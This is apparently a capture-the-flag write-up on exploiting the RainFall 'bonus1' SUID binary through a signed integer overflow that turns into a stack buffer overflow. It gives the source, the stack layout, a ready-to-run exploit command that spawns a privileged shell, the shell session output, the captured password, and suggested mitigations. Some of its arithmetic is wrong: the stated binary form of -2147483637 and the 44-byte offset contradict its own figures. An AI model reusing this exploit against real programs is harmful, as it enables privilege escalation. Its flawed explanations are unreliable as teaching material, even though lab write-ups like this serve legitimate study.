# Bonus1 Analysis - Integer Overflow to Buffer Overflow

## Overview
Bonus1 demonstrates a sophisticated **integer overflow vulnerability** that bypasses input validation to achieve buffer overflow. The challenge combines signed/unsigned integer confusion with precise memory layout exploitation to overwrite a stack variable with a magic value.

## Binary Information
- **File**: ELF 32-bit LSB executable, Intel 80386, dynamically linked
- **Permissions**: -rwsr-s---+ 1 bonus2 users (SUID bit set for bonus2)
- **Size**: 5043 bytes
- **Functions**: main(), memcpy(), atoi(), execl()
- **BuildID**: 5af8fd13428afc6d05de1abfa9d7e7621df174c7

## Source Code Analysis

### Program Structure
```c
int main(int ac, char **av) {
    int n;                    // Stack variable at ESP + 0x3C
    char buffer[40];          // Stack buffer at ESP + 0x14
    
    n = atoi(av[1]);          // Convert first argument to integer
    if (!(n <= 9))            // VULNERABILITY: Signed comparison
        return (1);
    
    memcpy(buffer, av[2], n * 4);  // VULNERABILITY: Integer overflow
    
    if (n == 0x574f4c46)      // Magic value check ("FLOW" in ASCII)
        execl("/bin/sh", "sh", NULL);  // Target: spawn shell
    
    return (0);
}
```

## Vulnerability Analysis

### Primary Vulnerabilities

#### 1. Integer Overflow in Size Calculation
```c
memcpy(buffer, av[2], n * 4);
```
- **Issue**: `n * 4` can overflow with negative values
- **Impact**: Large copy size despite `n <= 9` check
- **Example**: `-2147483637 * 4 = 44` (due to 32-bit wraparound)

#### 2. Signed vs Unsigned Type Confusion
```c
if (!(n <= 9))  // Signed comparison - allows negative numbers
```
- **Signed Check**: `-2147483637 <= 9` → TRUE (passes validation)
- **Unsigned Usage**: `memcpy()` treats size as unsigned (44 bytes copied)

#### 3. Stack Variable Proximity
```c
int n;           // Target variable 
char buffer[40]; // Overflow source
```
- **Layout**: Variables adjacent on stack (4-byte gap)
- **Offset**: `n` located 44 bytes from buffer start
- **Impact**: Buffer overflow can overwrite `n` with controlled data

## Memory Layout Analysis

### Stack Frame in main()
```
Higher Memory Addresses
┌─────────────────────────────────────┐
│ Saved EBP                          │ ← EBP
├─────────────────────────────────────┤
│ Return Address                     │ ← EBP + 4
├─────────────────────────────────────┤
│ argc (parameter)                   │ ← EBP + 8
├─────────────────────────────────────┤
│ argv (parameter)                   │ ← EBP + 12
├─────────────────────────────────────┤
│ ...alignment...                    │
├─────────────────────────────────────┤
│ n variable (int)                   │ ← ESP + 0x3C (TARGET)
├─────────────────────────────────────┤
│ buffer[40] (char array)            │ ← ESP + 0x14
└─────────────────────────────────────┘ ← ESP
Lower Memory Addresses

Overflow Path: buffer[40] → (4 bytes gap) → n variable
Total Distance: 44 bytes from buffer start to n
```

## Exploitation Methodology

### Step 1: Integer Overflow Calculation
```python
# Goal: Copy 44 bytes to overwrite n variable
# Constraint: n <= 9 (max 36 bytes normally)
# Solution: Use negative number overflow

# 32-bit signed integer arithmetic:
n = -2147483637
size = n * 4  # Results in 44 due to wraparound
# Binary: 0xFFFFFFD3 * 4 = 0x0000002C (44 decimal)
```

### Step 2: Magic Value Construction
```python
# Target value: 0x574f4c46
import struct
magic = struct.pack('<I', 0x574f4c46)  # Little-endian
print(repr(magic))  # 'FLOW'

# ASCII breakdown:
# 0x46 = 'F'
# 0x4c = 'L' 
# 0x4f = 'O'
# 0x57 = 'W'
```

### Step 3: Payload Construction
```bash
# Argument structure:
# argv[1]: "-2147483637"  (bypass check, trigger overflow)
# argv[2]: "A"*40 + "FLOW"  (fill buffer + overwrite n)

./bonus1 -2147483637 $(python -c 'print "A" * 40 + "FLOW"')
```

## Attack Flow Analysis

### Execution Sequence
1. **Input Parsing**: `n = atoi("-2147483637")` → `n = -2147483637`
2. **Validation Check**: `n <= 9` → TRUE (signed comparison allows negative)
3. **Size Calculation**: `n * 4 = -2147483637 * 4 = 44` (integer overflow)
4. **Memory Copy**: `memcpy(buffer, argv[2], 44)` → copies 44 bytes
5. **Buffer Overflow**: 
   - Bytes 0-39: Fill `buffer[40]` with 'A's
   - Bytes 40-43: Overwrite `n` with "FLOW" (0x574f4c46)
6. **Condition Check**: `n == 0x574f4c46` → TRUE
7. **Shell Execution**: `execl("/bin/sh", "sh", NULL)` → spawn privileged shell

### Mathematical Proof
```c
// 32-bit signed integer range: -2,147,483,648 to 2,147,483,647
int n = -2147483637;

// Multiplication in 32-bit arithmetic:
// -2147483637 * 4 = -8589934548
// Truncated to 32-bit: -8589934548 & 0xFFFFFFFF = 44

// Verification:
-2147483637 * 4 = 0xFFFFFFD3 * 4 = 0x0000002C = 44
```

## Integer Overflow Mechanics

### Two's Complement Arithmetic
```
Original value: -2147483637
Binary (32-bit): 11111111 11111111 11111111 11010011
Multiply by 4:   <<<< shift left 2 bits >>>>
Result:          00000000 00000000 00000000 00101100 = 44
```

### Why memcpy() Accepts This Size
- `memcpy()` expects `size_t` parameter (unsigned)
- Negative `int` converted to `size_t` becomes large positive
- However, due to overflow math, result is exactly 44

## Complete Exploit Execution

### Command Execution
```bash
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A" * 40 + "FLOW"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$ id
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users)
```

### Success Indicators
- **Shell Spawn**: Interactive shell obtained
- **Privilege Escalation**: EUID elevated to bonus2 (2012)
- **Flag Access**: Successfully read bonus2 password file

## Security Implications

### Root Causes
1. **Type Confusion**: Mixing signed/unsigned integer operations
2. **Insufficient Validation**: Only checking upper bound, not overflow conditions  
3. **Unsafe Memory Operations**: User-controlled size parameter to memcpy()
4. **Magic Value Logic**: Hardcoded comparison creates exploitation target

### Attack Vector Classification
- **CWE-190**: Integer Overflow or Wraparound
- **CWE-120**: Buffer Copy without Checking Size of Input  
- **CWE-681**: Incorrect Conversion between Numeric Types

### Modern Mitigations
```c
// Secure implementation example:
if (ac != 3) return 1;
unsigned int n = (unsigned int)atoi(av[1]);
if (n > 9) return 1;                          // Proper bounds check
unsigned int size = n * 4;
if (size < n || size > sizeof(buffer)) return 1;  // Overflow check
memcpy_s(buffer, sizeof(buffer), av[2], size);    // Safe copy
```

### Defensive Strategies
- **Input Sanitization**: Validate both range and overflow conditions
- **Type Consistency**: Use consistent signed/unsigned types throughout
- **Safe Functions**: Employ bounds-checked memory operations
- **Compiler Protection**: Enable integer overflow detection (-ftrapv, -fsanitize=integer)

## Flag Retrieved
```
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```